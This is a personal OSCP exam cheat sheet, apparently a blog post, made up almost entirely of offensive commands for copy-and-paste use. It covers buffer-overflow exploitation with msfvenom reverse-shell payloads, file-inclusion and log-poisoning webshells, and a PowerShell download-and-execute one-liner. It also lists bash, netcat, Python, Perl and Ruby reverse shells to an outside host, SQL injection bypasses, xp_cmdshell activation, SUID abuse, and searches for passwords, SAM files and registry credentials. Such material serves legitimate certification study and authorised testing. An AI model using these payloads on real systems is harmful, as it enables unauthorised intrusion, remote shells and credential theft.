---
title: OSCP CheatSheet
tags: OSCP
key: 20190516
comments: true
---

Just some oscp cheat sheet stuff that I customized for myself. It may look messy, I just use it to copy the command I needed easily.

The content in this [repo](https://github.com/xMilkPowderx/OSCP) is not meant to be a full list of commands that you will need in OSCP. It rather just a list of commands that I found them useful with a few notes on them.

## Buffer Overflow

**1. Check buffer length to trigger overflow**  

**2. Cofirm overflow length, append "A" * length**  

**3. Generate Offset to check EIP, ESP location**
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>

Record value on EIP, select ESP and click "Follow in Dump"  
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <value> -l <length>  

Use !mona to find the offset after the overflow  
!mona findmsp  
```
**4. Confirm EIP by adding "B" * 4 after the number of offset. Also, add a number of "C" to track the number of characters that can be added after EIP to confirm length of shellcode**

**5. Check bad characters after EIP. common bad characters are 0x00, 0x0A. Follow dump in ESP to check are there something missing after that.**
```
Add code:

badchar = [0x00]
for ch in range (0x00 , 0xFF+1):
	if ch not in badchar:
		<payload> += chr(ch)
```
**6. Find JMP ESP address in the system.**
```
JMP ESP = FFE4

!mona jmp -r esp -cpb "\x00\x0A" << bad character

!mona modules
!mona find -s "\xff\xe4" -m brainpan.exe

check the value of the address by naviate to it.
Set breakpoint
Change "B" in EIP to the address of JMP ESP << littile edian

e.g. 0x311712f3 >> "\xf3\x12\x17\x31"

Run again to check is the breakpoint triggered
```
**7. Add shellcode**
```
Add a few \x90 before shellcode to avoid shellcode being modify

msfvenom -p windows/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -f <Code Format> -a x86 -platform windows -b "\x00"
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -f <Code Format> -b "\x00"
```
**Bonus: Running out of shell code space?**
Use the front of payload instead
1. Is there any register points to the front of our payload? EAX, EDX?
2. Check JMP register address

```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

JMP EAX/EBX/ECX/EDX
```

3. Append the address as shell code.
4. Add payload to the front


## File Inclusion

[Exploiting PHP File Inclusion – Overview](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/)

Add %00 to test if the file is adding .php to the filename < before php version 5.3
Add ? to act as another parameter

include will execute the file. Others will not

### Local File inclusion
```php
$file = $_GET['page'];
require($file);
```
check with files that generally can be accessed
/etc/passwd
/etc/hostname
/etc/hosts

read php file
```
php://filter/convert.base64-encode/resource=<file name/Path> e.g. index
echo "<output>" |base64 -d
```
.htaccess
config.php in web root folder?

root/user ssh keys? .bash_history?
/.ssh/id_rsa
/.ssh/id_rsa.keystore
/.ssh/id_rsa.pub
/.ssh/authorized_keys
/.ssh/known_hosts

php Wrapper
```
expect://<command>  
```
page=php://input&cmd=ls  
in POST request  
```php
<?php echo shell_exec($_GET['cmd']);?>  
```
Upload Zip shell file and extract with zip
```
zip://path/to/file.zip%23shell  
zip://path/to/file.zip%23shell.php  
```
Check current running user  
/proc/self/status  
check uid and gid  

### Log Poisoning
[HTTPD Default Layout](https://wiki.apache.org/httpd/DistrosDefaultLayout)

**Common log file location**  
**Ubuntu, Debian**  
/var/log/apache2/error.log  
/var/log/apache2/access.log  

**Red Hat, CentOS, Fedora, OEL, RHEL**  
/var/log/httpd/error_log  
/var/log/httpd/access_log  
  
**FreeBSD**  
/var/log/httpd-error.log  
/var/log/httpd-access.log  

**Common Config file location**  
check any restriction or hidden path on accessing the server  

**Ubuntu**  
/etc/apache2/apache2.conf  

/etc/apache2/httpd.conf  
/etc/apache2/apache2.conf  
/etc/httpd/httpd.conf  
/etc/httpd/conf/httpd.conf  

**FreeBSD**  
/usr/local/etc/apache2/httpd.conf  

Hidden site?  
/etc/apache2/sites-enabled/000-default.conf  

proc/self/environ
[shell via LFI - proc/self/environ method](https://www.exploit-db.com/papers/12886/)

### SSH log posioning  
http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/  

### Mail log
```
telnet <IP> 25  
EHLO <random character>  

VRFY <user>@localhost  

mail from:attacker@attack.com  
rcpt to: <user>@localhost  
data  

Subject: title  
<?php echo system($_REQUEST['cmd']); ?>  

<end with .>  

LFI /var/mail/<user>  
```
### Remote File Inclusion
These two setting must be enabled to let RLI happens
requires allow_url_fopen=On and allow_url_include=On  
```php
$incfile = $_REQUEST["file"];  
include($incfile.".php");  
```

## File Transfer

[15 Ways to transfer a file](https://blog.netspi.com/15-ways-to-download-a-file/#perl)

### FTP

```
/etc/init.d/pure-ftpd restart
```

Windows

```
echo "open <IP>">ftp.txt  
echo "offsec">>ftp.txt  
echo "offsec">>ftp.txt  
echo "bin">>ftp.txt  
echo "get file.exe">>ftp.txt  
echo "bye">>ftp.txt  

ftp -s ftp.txt  
```

Linux

```
ftp -4 -d -v ftp://offsec:offsec@127.0.0.1//linuxprichecker.py < ftp upload one liner linux
```

### Powershell

```powershell
powershell.exe  (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip") 

powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<IP>/<script>')"
```

powershell full path:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe


### Smbsever

```
impacket-smbserver <share name> <path>

net view \\\\\<ip>
```

### SCP
After login through ssh
scp <fileToUpload> user@remote:/path

## File upload

If try to upload webshell to victim check how the exploit is done.
Check any bad characters

e.g. $XXX is taken as variable in bash, need to use \$ to escape

### WebDav  

upload file:

```
curl -T '/path/to/local/file.txt' 'https://example.com/test/'  
curl --upload-file \<file> http://\<IP>/test/\<filename>  

curl -X MOVE --header 'Destination:http://example.org/new.txt' 'https://example.com/old.txt'  
curl -X COPY --header 'Destination:http://example.org/new.txt' 'https://example.com/old.txt'  

login:  
curl --user 'user:pass' 'https://example.com'  
```

Upload bypass:  
https://www.owasp.org/index.php/Unrestricted_File_Upload  
https://soroush.secproject.com/blog/tag/unrestricted-file-upload/  
 
IIS 6.0 or below

```
Asp > upload as test.txt, copy or move file as test.asp;.txt

Php > upload as pHp / phP / test.php.jpg / 

php - phtml, .php, .php3, .php4, .php5, and .inc

asp - asp, .aspx

perl - .pl, .pm, .cgi, .lib

jsp - .jsp, .jspx, .jsw, .jsv, and .jspf

Coldfusion - .cfm, .cfml, .cfc, .dbm
```

Add:   

```php
GIF89a;
\<?
system($_GET['cmd']);//or you can insert your complete shell code
?>
```

### Options
Use options to check for upload method.

upload function. Is put allowed?

## Interesting files

### Windows
c:\windows\system32\eula.txt  
cl\windows\system32\license.rtf  

c:\WINDOWS\win.ini  
c:\WINNT\win.ini

Password hash?  
c:\WINDOWS\Repair\SAM    
c:\WINDOWS\Repair\system  
pwdump SAM system  

c:\WINDOWS\php.ini  
c:\WINNT\php.ini  
c:\Program Files\Apache Group\Apache\conf\httpd.conf  
c:\Program Files\Apache Group\Apache2\conf\httpd.conf  
c:\Program Files\xampp\apache\conf\httpd.conf  
c:\php\php.ini  
c:\php5\php.ini  
c:\php4\php.ini  
c:\apache\php\php.ini  
c:\xampp\apache\bin\php.ini  
c:\home2\bin\stable\apache\php.ini  
c:\home\bin\stable\apache\php.ini

https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/

### Linux
https://www.gracefulsecurity.com/path-traversal-cheat-sheet-linux/

## Reverse shell

**1. Check which port is allowed for reverse shell** 

sometime certain out going traffic is blocked by your victim   

```
nc -nvv -w 1 -z "Your IP Address" 1-100  
open Wireshark  
```

**2. Reverse shell list**  

```Bash  
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

```Php  
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```Perl  
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```Python  
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```Ruby  
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```  
1. nc -e /bin/sh 10.0.0.1 1234
(Really like this one)
2. rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f 
```

## SQL injection

### Login Bypass

```
' or '1'='1  
' or 1=1;--  
' or 1=1;#  
') or ('x'='x  
' or <column> like '%';--  
' or 1=1 LIMIT 1;--  

USERNAME:   ' or 1/*  
PASSWORD:   */ =1 --  

USERNAME: admin' or 'a'='a  
PASSWORD '#  
```

If the database is mysql, try to dump all login info to files?

Mysql
```
'*'   
'&'  
'^'  
'-'  
' or true;--   
' or 1;--  

union all select "<?php echo shell_exec($_GET['cmd']);?>",2,3,4,5,6 into OUTFILE '/var/www/html/shell.php'
```

### Enumeration
1. Confirm number of columns

```
order by 1 -- 100
```

2. union select

```
union select 1,2,3,4,5,6,7 to find which column will display info
```

3. Find databse name, user name, and version.  << must use group_concat for one liner

```
(select group_concat(database(),0x3a,user(),0x3a,version()))
```

4. Find table name

```
table_name                                      from information_schema.tables where table_schema=database()
(select group_concat(table_name) from information_schema.tables where table_schema=database())
```

5. Find columns 

```
column_name                                 from information_schema.columns where table_name='<Table_Name>'
column_name                                 from information_schema.columns where table_name=<HEX>
column_name                                 from information_schema.columns where table_name like <HEX>
(select group_concat(column_name) from information_schema.columns where table_name='dev_accounts')
(select group_concat(column_name) from information_schema.columns where table_name=0x6465765f6163636f756e7473)   << possible that some character are filtered out
```

6. Dump data

```
(select group_concat(id, 0x3A, username, 0x3A, password) from dev_accounts)
```

7. One liner to output all corresponding databse with table and columns

```
(select group_concat(table_schema,0x3a,table_name,0x3a,column_name) from information_schema.columns)
(select group_concat(table_schema,0x3a,table_name,0x3a,column_name) from information_schema.columns where table_schema=database())

concat(table_schema,0x3a,table_name,0x3a,column_name)               from information_schema.columns where table_schema=database()
```

### [MSSQL Enumeration: Error based](https://www.exploit-db.com/papers/12975/)

```
Enumerate column and table name
http://www.example.com/page.asp?id=1' HAVING 1=1--
Error message: Column 'news.news_id' is invalid                 < table_name.column

http://www.example.com/page.asp?id=1' GROUP BY news.news_id HAVING 1=1--
Error message: Column 'news.news_author' is invalid           < table_name.column2

http://www.example.com/page.asp?id=1' GROUP BY news.news_id,news.news_author HAVING 1=1--
Error message: Column 'news.news_detail' is invalid             < table_name.column3

Until no error

Enumerate version, db name, users:
http://www.example.com/page.asp?id=1+and+1=convert(int,@@version)--
http://www.example.com/page.asp?id=1+and+1=convert(int,db_name())--
http://www.example.com/page.asp?id=1+and+1=convert(int,user_name())--       << Is the user running as dbo or sa?

xp_cmdshell << if running as database admin
http://www.example.com/news.asp?id=1; exec master.dbo.xp_cmdshell 'command'
'; exec master.dbo.xp_cmdshell 'command'

On MSSQL 2005 you may need to reactivate xp_cmdshell first as it's disabled by default:
EXEC sp_configure 'show advanced options', 1;--
RECONFIGURE;-- 
EXEC sp_configure 'xp_cmdshell', 1;-- 
RECONFIGURE;--  

On MSSQL 2000:
EXEC sp_addextendedproc 'xp_anyname', 'xp_log70.dll';--
```

## SQL filter bypass
[Beyond SQLi: Obfuscate and Bypass](https://www.exploit-db.com/papers/17934/)

```
AND, OR operators
AND = &&
OR = ||

Comment operator << Mysql
--  	
#  
/**/  

Regular expression
It is common that PHPIDS will block operators such as =, ', (), 
table_name = 'users' X
table_name between 'a' and 'z' X
table_name between char(97) and char(122) X

Convert strings to HEX format.
table_name between 0x61 and 0x7a
table_name like 0x7573657273

Change case
union > UniOn
select > SeLect

Inline comments << Mysql 5.0
/*! <sql operator> */
```

## Privilege Escalation

### Linux privilege escalation
#### Spawn Interactive Shell and set env  

python -c 'import pty;pty.spawn("/bin/bash");'  
ctrl z  
echo $TERM  
stty -a  
stty raw -echo  
fg  

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH  
export TERM=xterm256-color  
export SHELL=bash  

stty rows \<> colums \<>  

#### Restricted bash
perl -e 'exec "/bin/sh";'  
/bin/sh -i  
exec "/bin/sh";  
echo os.system('/bin/bash')  
/bin/sh -i  
ssh user@$ip nc $localip 4444 -e /bin/sh  
export TERM=linux  

#### Check environment 
Check any restricitions on any folders  
mount -l        >> any no exec or no suid?  

Check any unmounted drives  
cat /etc/fstab  

#### SUID
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.  
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.  
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.  

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID < full search  
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin < quicker  

-find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null  

find / perm /u=s -user "User name that you are looking for" 2>/dev/null  

#### Writable file and nobody files  
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files  
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files  

#### Writable by current user  
find / perm /u=w -user `whoami` 2>/dev/null  
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null  
find / -perm /u+w -user `whoami` 2>/dev/nul  

#### Any script files that we can modify?  
find / -writable -type f -name "*.py" 2>/dev/null     #find all python file that can be write by us  

ls -aRl / | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone  
ls -aRl / | awk '$1 ~ /^..w/' 2>/dev/null       # Owner  
ls -aRl / | awk '$1 ~ /^.....w/' 2>/dev/null    # Group  
ls -aRl / | awk '$1 ~ /w.$/' 2>/dev/null        # Other  

find / -readable -type f 2>/dev/null               # Anyone  
find / -readable -type f -maxdepth 1 2>/dev/null   # Anyone  

#### Any service running by root?  
ps aux|grep "root"  

/usr/bin/journalctl (Which is normally not readable by a user) << cron job?  

#### Find password  
grep -rnw '/' -ie 'pass' --color=always  
grep -rnw '/' -ie 'DB_PASS' --color=always  
grep -rnw '/' -ie 'DB_PASSWORD' --color=always  
grep -rnw '/' -ie 'DB_USER' --color=always  

#### Exploit Time
#### SUID
##### Is suid bit set on these applications?

Nmap  
    nmap -V     <Nmap version 2.02 - 5.21 had an interactive mode  
    nmap --interactive  
    nmap> !sh  
    
Vim  
    Modify system file, e.g. passwd?  
    
    vim.tiny  
    - Press ESC key  
    :set shell=/bin/sh  
    :shell  
    
find  
    touch pentestlab  
    find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;  
    
Bash  
    bash -p      
            
More  
    
Less  
    less /etc/passwd  
    !/bin/sh  

Nano  
    Can you modify system file?  
    Modify /etc/suoders  
    \<user> ALL=(ALL) NOPASSWD:ALL  
    
cp  
    Use cp to overwrite passwd with a new password  
    
##### Is there a custom suid application?  
How can this application be run?  
Can be modify the path variable so that it will execute something else  

#### NFS priv esc
https://medium.com/@Kan1shka9/hacklab-vulnix-walkthrough-b2b71534c0eb

#### Linux capability
find / -type f -print0 2>/dev/null | xargs -0 getcap 2>/dev/null
getcap -r /

google that capability on how it can help us get root

#### Mysql run by root
MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library
https://www.exploit-db.com/exploits/1518/

You can also try
select sys_exec('echo test>/tmp/test.txt');
select sys_eval('echo test>/tmp/test.txt');

### Windows Privilege Escalation

#### patch level  
systeminfo  
wmic qfe get Caption,Description,HotFixID,InstalledOn  

whoami  
echo %USERNAME%  

net user  
net localgroup  

users in a domain  
net user /domain  

net group /domain  
net group /domain <Group Name>  

#### Firewall  
netsh firewall show state  
netsh firewall show config  

#### Network  
ipconfig /all  
route print  
arp -A  

#### Scheduled Tasks  
schtasks /query /fo LIST /v  
--copy output and save in txt  
cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM  

dir %SystemRoot%\Tasks  

e.g. c:\windows\tasks\  
e.g. c:\windows\system32\tasks\  

#### Weak Service Permissions  
Check service config can be modify or not  

accesschk.exe /accepteula  
accesschk.exe -uwcqv "Authenticated Users" * /accepteula  
accesschk.exe -ucqv \<Service Name>  

sc qc \<Service Name> -- Get service details  

Check service with weak file permission  
User c:\windows\temp\  

wmic.exe  
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"  

sc.exe  
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt  
FOR /F %i in (Servicenames.txt) DO echo %i  
type Servicenames.txt  
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt  
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt  

#### Unquoted Service Path  
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """  

sc query  
sc qc service name  

#### AlwaysInstallElevated << IF 64 bits use:  %SystemRoot%\Sysnative\reg.exe  
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  

#### Service only available from inside  
netstat -ano  
upload plink.exe  

plink.exe -R "remote port":127.0.0.1:"local port"  root@"ipaddress"

#### Pasword in files  
https://pentestlab.blog/tag/privilege-escalation/page/3/  
cmdkey /list        << If there are entries, it means that we may able to runas certain user who stored his cred in windows  
runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \\IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"  

Can we find any SAM files?  
%SYSTEMROOT%\repair\SAM  
%SYSTEMROOT%\System32\config\RegBack\SAM  
%SYSTEMROOT%\System32\config\SAM  
%SYSTEMROOT%\repair\system  
%SYSTEMROOT%\System32\config\SYSTEM  
%SYSTEMROOT%\System32\config\RegBack\system  

findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
findstr /si pass/pwd *.ini  

dir /s *pass* == *cred* == *vnc* == *.config*  

in all files  
findstr /spin "password" *.*  
findstr /spin "password" *.*  

Unattended? vnc?  
c:\sysprep.inf  
c:\sysprep\sysprep.xml  
c:\unattend.xml  
%WINDIR%\Panther\Unattend\Unattended.xml  
%WINDIR%\Panther\Unattended.xml  

dir /b /s unattend.xml  
dir /b /s web.config  
dir /b /s sysprep.inf  
dir /b /s sysprep.xml  
dir /b /s *pass*  

dir c:\*vnc.ini /s /b  
dir c:\*ultravnc.ini /s /b   
dir c:\ /s /b | findstr /si *vnc.ini  

#### VNC  
reg query "HKCU\Software\ORL\WinVNC3\Password"  
reg query "HKCU\Software\TightVNC\Server"  

#### Windows autologin  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  

#### SNMP Paramters  
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  

#### Putty  
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  

#### Search for password in registry  
reg query HKLM /f password /t REG_SZ /s  
reg query HKCU /f password /t REG_SZ /s  

